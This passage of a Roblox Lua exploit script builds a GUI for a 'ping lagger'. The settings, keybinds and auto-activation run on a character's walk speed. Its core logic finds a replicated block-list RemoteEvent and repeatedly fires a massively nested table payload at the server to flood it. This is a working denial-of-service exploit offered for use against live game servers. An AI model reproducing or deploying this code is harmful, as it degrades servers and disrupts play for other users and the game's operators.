    Instance.new("UICorner", confirmNo).CornerRadius = UDim.new(0,7)

    confirmYes.MouseEnter:Connect(function() tw(confirmYes,{BackgroundColor3=C.gold1},0.1) end)
    confirmYes.MouseLeave:Connect(function() tw(confirmYes,{BackgroundColor3=C.glow},0.1) end)
    confirmNo.MouseEnter:Connect(function()  tw(confirmNo,{TextColor3=C.white},0.1) end)
    confirmNo.MouseLeave:Connect(function()  tw(confirmNo,{TextColor3=C.dim},0.1) end)

    local function hideConfirm() confirmBackdrop.Visible = false end

    confirmNo.MouseButton1Click:Connect(hideConfirm)

    confirmYes.MouseButton1Click:Connect(function()
        cfg.power        = DEFAULT_CFG.power
        cfg.interval     = DEFAULT_CFG.interval
        cfg.keybindKb    = DEFAULT_CFG.keybindKb
        cfg.keybindGp    = DEFAULT_CFG.keybindGp
        cfg.autoBrainrot = DEFAULT_CFG.autoBrainrot
        cfg.mode         = DEFAULT_CFG.mode

        local m = MODES[cfg.mode]
        if m then
            cfg.power    = m.power
            cfg.interval = m.interval
        end

        powerBox.Text    = tostring(cfg.power)
        intervalBox.Text = tostring(cfg.interval)
        updateKbLabels()

        if autoBrainrotBtn then
            autoBrainrotBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
            tw(autoBrainrotBtn, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)}, 0.15)
        end

        refreshModeButtons()
        saveConfig()
        hideConfirm()
    end)

    resetBtn.MouseButton1Click:Connect(function()
        confirmLbl.Text = "Reset all settings to defaults?"
        confirmBackdrop.Visible = true
    end)

    -- ══════════════════════════════════════════════════════════════════════
    -- SETTINGS OPEN / CLOSE
    -- ══════════════════════════════════════════════════════════════════════
    local settingsOpen = false

    local function openSettings()
        settingsOpen          = true
        settingsFrame.Visible = true
        settingsFrame.Size    = UDim2.new(0,SET_W,0,0)
        tw(settingsFrame, {Size=UDim2.new(0,SET_W,0,SET_H)}, 0.2)
        tw(settingsEmojiBtn, {BackgroundColor3=C.gold1}, 0.12)
        powerBox.Text    = tostring(cfg.power)
        intervalBox.Text = tostring(cfg.interval)
        updateKbLabels()
        if autoBrainrotBtn then
            autoBrainrotBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
            autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)
        end
    end

    local function closeSettings()
        settingsOpen = false
        listeningFor = nil
        updateKbLabels()
        tw(settingsFrame, {Size=UDim2.new(0,SET_W,0,0)}, 0.16)
        task.delay(0.18, function() settingsFrame.Visible = false end)
        tw(settingsEmojiBtn, {BackgroundColor3=Color3.fromRGB(55, 18, 22)}, 0.12)
        hideConfirm()
    end

    settingsEmojiBtn.MouseButton1Click:Connect(function()
        if settingsOpen then closeSettings() else openSettings() end
    end)
    setCloseBtn.MouseButton1Click:Connect(closeSettings)

    -- ══════════════════════════════════════════════════════════════════════
    -- PING LAGGER LOGIC
    -- ══════════════════════════════════════════════════════════════════════
    local function findRemote()
        local rrs = game:FindFirstChild("RobloxReplicatedStorage")
        if not rrs then return nil end
        local remote
        for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
            local r = rrs:FindFirstChild(name)
            if r and r:IsA("RemoteEvent") then remote = r break end
        end
        if not remote then
            for _, c in ipairs(rrs:GetChildren()) do
                if c:IsA("RemoteEvent") and c.Name:find("Block") then remote = c break end
            end
        end
        return remote
    end

    remote = findRemote()

    local function buildPayload(power)
        local main = {}
        local nested = {{}}
        local current = nested[1]
        for _ = 1, 186 do
            local n = {}
            table.insert(current, n)
            current = n
        end
        local maxRep = math.min(math.floor(power / 188), 10000)
        for _ = 1, maxRep do
            table.insert(main, nested)
        end
        return main
    end

    local function runPingLoop()
        local delay = cfg.interval
        while active and remote do
            local payload = buildPayload(cfg.power)
            local ok = pcall(function() remote:FireServer(payload) end)
            if not ok then
                delay = math.min(delay * 1.5, 0.5)
            else
                delay = math.max(delay * 0.995, 0.05)
            end
            task.wait(delay)
        end
    end

    local function flipLag(state, isManual)
        active = state

        if isManual then
            if brainrotMode then
                manualOverride = not state
            else
                manualOverride = false
            end
        end

        if active then
            if not remote then
                remote = findRemote()
                if not remote then
                    active = false
                    flipLag(false)
                    return
                end
            end
            activateGrad.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0,C.gold2),
                ColorSequenceKeypoint.new(1,C.gold3),
            })
            activateLbl.Text            = "ACTIVATED"
            activateStroke.Color        = C.white
            activateStroke.Transparency = 0
            statusLbl.Text              = "ON"
            statusLbl.TextColor3        = C.green
            tw(statusPill, {BackgroundColor3=Color3.fromRGB(12, 55, 28)}, 0.2)
            mainStroke.Color            = C.green
            mainStroke.Transparency     = 0.1
            task.spawn(runPingLoop)
        else
            activateGrad.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0,C.gold1),
                ColorSequenceKeypoint.new(1,C.gold2),
            })
            activateLbl.Text            = "ACTIVATE"
            activateStroke.Color        = C.gold3
            activateStroke.Transparency = 0.4
            statusLbl.Text              = "OFF"
            statusLbl.TextColor3        = C.red
            tw(statusPill, {BackgroundColor3=Color3.fromRGB(70, 20, 25)}, 0.2)
            mainStroke.Color            = C.gold1
            mainStroke.Transparency     = 0.35
        end
    end

    activateBtn.MouseButton1Click:Connect(function()
        flipLag(not active, true)
    end)
    activateBtn.MouseEnter:Connect(function()
        if not active then tw(activateBtn,{BackgroundColor3=Color3.fromRGB(120, 35, 40)},0.1) end
    end)
    activateBtn.MouseLeave:Connect(function()
        if not active then tw(activateBtn,{BackgroundColor3=C.card},0.1) end
    end)

    -- ══════════════════════════════════════════════════════════════════════
    -- AUTO BRAINROT DETECTION
    -- ══════════════════════════════════════════════════════════════════════
    RunService.Heartbeat:Connect(function()
        if not cfg.autoBrainrot then
            if brainrotMode then
                brainrotMode = false
                lastBrainrotState = false
            end
            return
        end

        local char = plr.Character
        if not char then return end
        local hum = char:FindFirstChild("Humanoid")
        if not hum then return end

        local hasBrainrot = hum.WalkSpeed < 25

        if hasBrainrot and not lastBrainrotState then
            brainrotMode = true
            lastBrainrotState = true
            manualOverride = false
            flipLag(true)
        elseif not hasBrainrot and lastBrainrotState then
            brainrotMode = false
            lastBrainrotState = false
            manualOverride = false
            flipLag(false)
        end
    end)

    -- ══════════════════════════════════════════════════════════════════════
    -- INPUT HANDLER
    -- ══════════════════════════════════════════════════════════════════════
    UserInputService.InputBegan:Connect(function(input, processed)
        local kc  = input.KeyCode
        if kc == Enum.KeyCode.Unknown then return end

        local isGp = isGamepad(kc)
        local isKb = input.UserInputType == Enum.UserInputType.Keyboard

        if listeningFor then
            if kc == Enum.KeyCode.Escape then
                listeningFor = nil
                updateKbLabels()
                return
            end
            if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
                cfg.keybindKb = kc.Name
                listeningFor  = nil
                updateKbLabels()
                saveConfig()
                return
            end
            if listeningFor == "gp" and isGp then
                cfg.keybindGp = kc.Name
                listeningFor  = nil
                updateKbLabels()
                saveConfig()
                return
            end
            return
        end

        if processed then return end

        if kc == Enum.KeyCode.LeftControl then
            mainFrame.Visible = not mainFrame.Visible
            if not mainFrame.Visible then closeSettings() end
            return
        end

        local kbEnum = resolveKb(cfg.keybindKb)
        local gpEnum = resolveKb(cfg.keybindGp)

        if (kbEnum and kc == kbEnum and isKb)
        or (gpEnum and kc == gpEnum and isGp) then
            flipLag(not active, true)
        end
    end)

    updateKbLabels()
    _MVPPingLaggerScreen = screen
    return screen
end

-- Auto open al ejecutar
openMVPPingLagger()